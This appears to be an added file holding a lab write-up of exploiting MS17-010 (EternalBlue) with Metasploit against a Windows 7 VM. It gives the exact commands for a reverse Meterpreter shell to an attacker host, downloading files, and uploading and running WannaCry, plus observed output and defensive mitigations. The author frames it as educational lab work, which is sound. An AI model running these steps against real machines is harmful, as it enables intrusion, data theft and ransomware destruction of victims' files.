@@ -1,0 +1,293 @@
+================================================================
+   WANNACRY RANSOMWARE SIMULATION - PENETRATION TESTING WRITEUP
+================================================================
+Author     : YASH BHURE
+Date       : June 20, 2026
+Environment: Isolated VMware Lab (Kali Linux Attacker → Windows 7 Target)
+Purpose    : Educational simulation of MS17-010 exploitation and
+             WannaCry ransomware behavior in a controlled lab setting.
+
+DISCLAIMER: This simulation was conducted in a fully isolated virtual
+lab environment. All actions were performed on machines owned and
+controlled by the author for educational purposes only. Replicating
+these steps on systems without explicit written authorization is
+illegal and unethical.
+
+================================================================
+PART 1 — SCANNING THE NETWORK & FINDING THE VULNERABLE MACHINE
+================================================================
+
+Step 1: Identify Your Attacker Machine's IP Address
+----------------------------------------------------
+Command:
+    ifconfig
+
+Output (relevant section):
+    eth0: inet [ATTACKER-IP]  netmask 255.255.255.0
+
+The attacker machine (Kali Linux) was confirmed to be live on the
+local subnet.
+
+------------------------------------------------------------------
+
+Step 2: Switch to Root for Privileged Scanning
+-----------------------------------------------
+Command:
+    sudo su
+
+Root privileges are required for SYN/raw-packet scans with Nmap.
+
+------------------------------------------------------------------
+
+Step 3: Discover Open Ports on the Target Machine
+--------------------------------------------------
+Command:
+    nmap -Pn [TARGET-IP]
+
+Key open ports discovered:
+    135/tcp  — msrpc
+    139/tcp  — netbios-ssn
+    445/tcp  — microsoft-ds   ← SMB (critical)
+    49152–49157/tcp — msrpc (ephemeral RPC ports)
+
+The presence of port 445 (SMB) immediately flagged the target as a
+candidate for MS17-010 (EternalBlue) testing.
+
+------------------------------------------------------------------
+
+Step 4: Run Vulnerability Scan Against the Target
+--------------------------------------------------
+Command:
+    nmap --script vuln -sV [TARGET-IP]
+
+Key findings:
+    OS Detected  : Windows 7 Home Basic 7601 Service Pack 1 (x64)
+    Hostname     : WINDOWS7
+    Workgroup    : WORKGROUP
+
+    [CRITICAL] smb-vuln-ms17-010: VULNERABLE
+    CVE          : CVE-2017-0143
+    Risk         : HIGH — Remote Code Execution via SMBv1
+
+The Nmap vuln script confirmed the target is vulnerable to
+EternalBlue (MS17-010), the same exploit used by WannaCry in 2017.
+
+================================================================
+PART 2 — EXPLOITING THE VULNERABILITY & GETTING A REVERSE SHELL
+================================================================
+
+Step 5: Launch Metasploit Framework
+------------------------------------
+Command:
+    msfconsole
+
+------------------------------------------------------------------
+
+Step 6: Search for MS17-010 Exploit Modules
+--------------------------------------------
+Command:
+    search ms17-010
+
+Relevant modules found:
+    exploit/windows/smb/ms17_010_eternalblue  — Rank: average
+    exploit/windows/smb/ms17_010_psexec       — Rank: normal
+    auxiliary/scanner/smb/smb_ms17_010        — Detection scanner
+    exploit/windows/smb/smb_doublepulsar_rce  — Rank: great
+
+Selected module: exploit/windows/smb/ms17_010_eternalblue
+
+------------------------------------------------------------------
+
+Step 7: Load the EternalBlue Exploit Module
+--------------------------------------------
+Command:
+    use exploit/windows/smb/ms17_010_eternalblue
+
+Default payload auto-selected:
+    windows/x64/meterpreter/reverse_tcp
+
+------------------------------------------------------------------
+
+Step 8: Configure Exploit Options
+-----------------------------------
+Commands:
+    set RHOSTS [TARGET-IP]       ← IP of the vulnerable Windows 7 VM
+    set LHOST  [ATTACKER-IP]     ← IP of the Kali Linux machine
+    set LPORT  4444              ← Port to receive the reverse shell
+    set RPORT  445               ← SMB port on target (default, do not change)
+    set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+Note: An early mistake set RPORT to 4444 instead of 445. This caused
+the check to fail with "connection refused". Always ensure RPORT=445
+for SMB-based exploits.
+
+Verify settings with:
+    show options
+
+------------------------------------------------------------------
+
+Step 9: Verify the Target is Exploitable
+-----------------------------------------
+Command:
+    check
+
+Expected result:
+    [+] Host is likely VULNERABLE to MS17-010!
+        Windows 7 Home Basic 7601 Service Pack 1 x64 (64-bit)
+
+------------------------------------------------------------------
+
+Step 10: Execute the Exploit
+-----------------------------
+Command:
+    exploit
+
+Exploit execution flow (observed output):
+    [*] Started reverse TCP handler on [ATTACKER-IP]:4444
+    [+] Target is vulnerable — MS17-010 confirmed
+    [+] Target OS valid (Windows 7 SP1 x64)
+    [*] Attempting pool grooming (12 → 17 → 22 allocations)
+    [+] ETERNALBLUE overwrite completed successfully (0xC000000D)
+    [*] Sending stage (230982 bytes) to [TARGET-IP]
+    [*] Meterpreter session 1 opened
+        ([ATTACKER-IP]:4444 → [TARGET-IP]:[ephemeral-port])
+
+A SYSTEM-level Meterpreter session was established successfully.
+
+------------------------------------------------------------------
+
+Step 11: Explore the Target Filesystem
+----------------------------------------
+Commands used inside Meterpreter:
+    ls                         ← List current directory (C:\)
+    cd Users                   ← Navigate into Users folder
+    ls                         ← Found: vboxuser, Default, Public
+    cd vboxuser                ← Navigate to target user's home
+    ls                         ← Found AppData, Desktop, Documents, Downloads, etc.
+    cd Desktop                 ← Navigate to Desktop
+    ls                         ← Found sensitive files:
+                                   financial_records.txt
+                                   medical_records.txt
+                                   sensitive_docs.txt
+                                   (plus sample Windows media files)
+
+Notable: These files were placed in the lab to simulate real-world
+sensitive data that ransomware would target.
+
+------------------------------------------------------------------
+
+Step 12: Download Sample Files (Proof of Access)
+-------------------------------------------------
+Commands:
+    download financial_records.txt
+    download Jellyfish.jpg
+
+Both files were successfully transferred to the Kali machine at /home/kali/.
+
+================================================================
+PART 3 — UPLOADING & EXECUTING WANNACRY RANSOMWARE
+================================================================
+
+Step 13: Upload WannaCry Executable to Target
+----------------------------------------------
+Command (from Meterpreter):
+    upload WannaCry.exe
+
+The WannaCry.exe sample (used strictly in this isolated lab) was
+uploaded to the target's Desktop directory.
+
+Confirmation (from ls after upload):
+    100777/rwxrwxrwx  3514368  fil  WannaCry.exe
+
+------------------------------------------------------------------
+
+Step 14: Execute WannaCry on the Target
+-----------------------------------------
+Command:
+    execute -f WannaCry.exe
+
+WannaCry began executing immediately. The following activity was
+observed through repeated ls commands on the Desktop:
+
+  Phase 1 — Dropper Unpacks Components:
+    @WanaDecryptor@.exe       ← Ransom payment UI
+    @WanaDecryptor@.bmp       ← Desktop wallpaper (ransom notice)
+    @Please_Read_Me@.txt      ← Ransom note
+    00000000.eky              ← Encrypted session key
+    00000000.pky              ← Public key
+    00000000.res              ← Status/resource file
+    TaskData/                 ← WannaCry task directory
+    msg/                      ← Multilingual ransom messages
+    b.wnry, c.wnry, f.wnry, r.wnry, s.wnry, t.wnry, u.wnry
+                              ← WannaCry internal resource files
+    taskdl.exe, taskse.exe    ← WannaCry helper executables
+
+  Phase 2 — File Encryption:
+    All files on the Desktop were encrypted with .WNCRY extension:
+        Chrysanthemum.jpg      → Chrysanthemum.jpg.WNCRY
+        Desert.jpg             → Desert.jpg.WNCRY
+        Hydrangeas.jpg         → Hydrangeas.jpg.WNCRY
+        Jellyfish.jpg          → Jellyfish.jpg.WNCRY
+        Kalimba.mp3            → Kalimba.mp3.WNCRY
+        Koala.jpg              → Koala.jpg.WNCRY
+        Lighthouse.jpg         → Lighthouse.jpg.WNCRY
+        Penguins.jpg           → Penguins.jpg.WNCRY
+        Tulips.jpg             → Tulips.jpg.WNCRY
+        Wildlife.wmv           → Wildlife.wmv.WNCRY
+        financial_records.txt  → financial_records.txt.WNCRY
+        medical_records.txt    → medical_records.txt.WNCRY
+        sensitive_docs.txt     → sensitive_docs.txt.WNCRY
+
+The original files were deleted after encryption. Only the .WNCRY
+encrypted versions remained, rendering all data inaccessible without
+the decryption key.
+
+================================================================
+SUMMARY & OBSERVATIONS
+================================================================
+
+Attack Chain Recap:
+-------------------
+  1. Network scan revealed open SMB port (445) on target
+  2. Vuln scan confirmed MS17-010 (EternalBlue) — CVE-2017-0143
+  3. Metasploit EternalBlue exploit delivered Meterpreter shell
+  4. SYSTEM-level access obtained — no credentials needed
+  5. WannaCry.exe uploaded and executed via Meterpreter
+  6. All Desktop files encrypted with .WNCRY extension in seconds
+
+Key Lessons Learned:
+---------------------
+  • Unpatched SMBv1 is catastrophically dangerous — patch immediately
+    (Microsoft KB4012212 / MS17-010 security bulletin)
+  • EternalBlue requires zero credentials — just network access to 445
+  • WannaCry encrypts files extremely fast after execution
+  • SYSTEM-level shell via kernel exploit bypasses all user controls
+  • Even "Home Basic" consumer Windows is fully exploitable
+
+Common Mistakes Made During Lab (for learning):
+------------------------------------------------
+  • LHOST was initially left as 127.0.0.1 (loopback) — reverse shell
+    never reaches back; always set to the real attacker NIC IP
+  • RPORT was accidentally changed to 4444 — SMB always runs on 445
+  • Used "shoe" instead of "show options" (typo — Metasploit caught it)
+  • Used "remove" to unset a variable — correct command is "unset"
+
+Mitigations (Blue Team / Defender Perspective):
+------------------------------------------------
+  • Disable SMBv1 immediately on all Windows systems
+  • Apply MS17-010 patch (released March 2017) — KB4012212
+  • Block inbound TCP 445 at network perimeter/firewall
+  • Segment networks to limit lateral movement
+  • Maintain offline, tested backups for ransomware recovery
+  • Deploy endpoint detection and response (EDR) solutions
+  • Monitor for unusual SMB traffic patterns (IDS/IPS rules)
+
+References:
+-----------
+  CVE-2017-0143    : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+  MS17-010 Bulletin: https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+  WannaCry Advisory: https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+
+================================================================
+END OF WRITEUP
+================================================================
